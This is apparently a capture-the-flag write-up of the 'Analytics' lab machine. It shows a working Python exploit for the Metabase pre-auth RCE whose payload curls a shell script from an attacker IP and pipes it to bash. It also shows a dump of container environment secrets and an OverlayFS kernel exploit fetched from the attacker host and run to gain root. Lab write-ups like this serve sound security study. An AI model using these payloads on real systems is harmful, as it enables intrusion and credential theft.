![analytics.png](analytics.png)

# Analytics

## Enum

```bash
nmap -sC -sV -Pn 10.10.11.233 -oN scans/nmap.initial
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 19:38 IST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 19:39 (0:00:06 remaining)
Nmap scan report for 10.10.11.233
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.32 seconds
```

Hitting the login button drops us into a login page for `metabase` at `data.analytical.htb`  

quickly grepping through the source of the page we get the version of metabase
```json
"version": {
    "date":"2023-06-29",
    "tag":"v0.46.6",
    "branch":"release-x.46.x",
    "hash":"1bb88f5"
}
```

## Pre-Auth RCE 
It seems to be vulnerable to 
[this](https://infosecwriteups.com/cve-2023-38646-metabase-pre-auth-rce-866220684396)

Getting a token
```bash
curl -s data.analytical.htb/api/session/properties|jq '.["setup-token"]'
"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
```

There are a bazillion PoC scripts online, but none worked out of the box for me.  
This is what ended up working after a little bit of modification.
```python
import requests
import argparse


def post_setup_validate(ip_address, setup_token):

    endpoint = "/api/setup/validate"
    url = f"{ip_address}{endpoint}"
    headers = {'Content-Type': 'application/json'}
    data = {
        "token": setup_token,
        "details": {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules": {},
            "details": {
                "db": "zip:/app/metabase.jar!/sample-database.db;"
                "MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;"
                "CREATE TRIGGER pwnshell BEFORE "
                "SELECT ON INFORMATION_SCHEMA.TABLES "
                "AS $$//javascript\n"
                "java.lang.Runtime.getRuntime().exec"
                "('bash -c {curl,http://10.10.14.211:9090/sh.sh}|{bash,-i}')\n"
                "$$--=x",
                "advanced-options": False,
                "ssl": True
            },
            "name": "test",
            "engine": "h2"
        }
    }

    print(
        f"[DEBUG] Sending request to {url} with headers {headers} and data "
        "{json.dumps(data, indent=4)}"
    )

    try:
        response = requests.post(url, headers=headers, json=data, verify=False)
        print(f"[DEBUG] Response received: {response.text}")
        if response.status_code == 200:
            print(f"[DEBUG] POST to {url} successful.\n")
        else:
            print(
                f"[DEBUG] POST to {url} failed "
                "with status code: {response.status_code}\n"
            )
    except requests.exceptions.RequestException as e:
        print(f"[DEBUG] Exception occurred: {e}")
        print(f"[DEBUG] Failed to connect to {url}\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Check setup token')
    parser.add_argument('--rhost', type=str, help='Server address)')
    parser.add_argument('--token', type=str, help='Metabase token)')
    args = parser.parse_args()
    post_setup_validate(args.rhost, args.token)
```

Of course this implies a staged paload on my machine
```bash
python3 exploit.py \
    --rhost "http://data.analytical.htb" \
    --token "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
```

We get a shell in the docker container where metabase is running, and The password in the env gives ssh access to the box
```bash
15cad91f3df5:/$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=15cad91f3df5
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=A*****************
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

Just for the sake of exploarion I figured out that he database in '/metabase.db/metabase.db' is an H2 database, and we can connect to it like this:
```bash
15cad91f3df5:/app$ java -cp metabase.jar org.h2.tools.Shell
java -cp metabase.jar org.h2.tools.Shell

Welcome to H2 Shell 2.1.212 (2022-04-09)
Exit with Ctrl+C
[Enter]   jdbc:h2:~/test
URL       jdbc:h2:/metabase.db/metabase.db
[Enter]   org.h2.Driver
Driver
[Enter]
User
Password  Password  ><
Connected
Commands are case insensitive; SQL statements end with ';'
help or ?      Display this help
list           Toggle result list / stack trace mode
maxwidth       Set maximum column width (default is 100)
autocommit     Enable or disable autocommit
history        Show the last 20 statements
quit or exit   Close the connection and exit
```

List the tables:
```sql
sql> SELECT * FROM INFORMATION_SCHEMA.TABLES;
```

Read the 'CORE_USER' table
```sql
sql> list
Result list mode is now on
sql> select * from core_user;
ID              : 1
EMAIL           : metalytics@analytical.htb
FIRST_NAME      : Johnny
LAST_NAME       : Smith
PASSWORD        : $2a$10$HnyM8tXhWXhlxEtfzNJE0.z.aA6xkb5ydTRxV5uO5v7IxfoZm08LG
PASSWORD_SALT   : c50cd8da-0e37-446a-a87d-6f66f47a3334
DATE_JOINED     : 2023-08-03 12:45:16.569638
LAST_LOGIN      : 2023-10-29 10:16:35.913215
IS_SUPERUSER    : TRUE
IS_ACTIVE       : TRUE
RESET_TOKEN     : null
RESET_TRIGGERED : null
IS_QBNEWB       : TRUE
GOOGLE_AUTH     : FALSE
LDAP_AUTH       : FALSE
LOGIN_ATTRIBUTES: null
UPDATED_AT      : 2023-10-29 10:16:35.913215
SSO_SOURCE      : null
LOCALE          : null
IS_DATASETNEWB  : TRUE
SETTINGS        : {"user-recent-views":"[]"}
(1 row, 3 ms)
```
And we get a hash but it's bcrypt with a cost of 12 and a salt. Probably not worth our time then.

## GameOverLay Privesc

Anyways, once on the box as the metalytics user, we can see that this is ubuntu `"22.04.3 LTS (Jammy Jellyfish)"` 
```bash
cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.3 LTS"
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```
```bash
uname -r
6.2.0-25-generic
```
This makes it vulnerable to gameoverlay

[https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) didn't work  
[https://github.com/briskets/CVE-2021-3493](https://github.com/briskets/CVE-2021-3493) but this one did  

```bash
git clone git@github.com:briskets/CVE-2021-3493.git
cd CVE-2021-3493
gcc exploit.c -o exploit
```
```bash
metalytics@analytics:~$ curl http://10.10.14.211:9090/exploit -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16728  100 16728    0     0   140k      0 --:--:-- --:--:-- --:--:--  142k
metalytics@analytics:~$ chmod +x exploit
metalytics@analytics:~$ ./exploit
bash-5.1# id
uid=0(root) gid=0(root) groups=0(root),1000(metalytics)
bash-5.1#
```
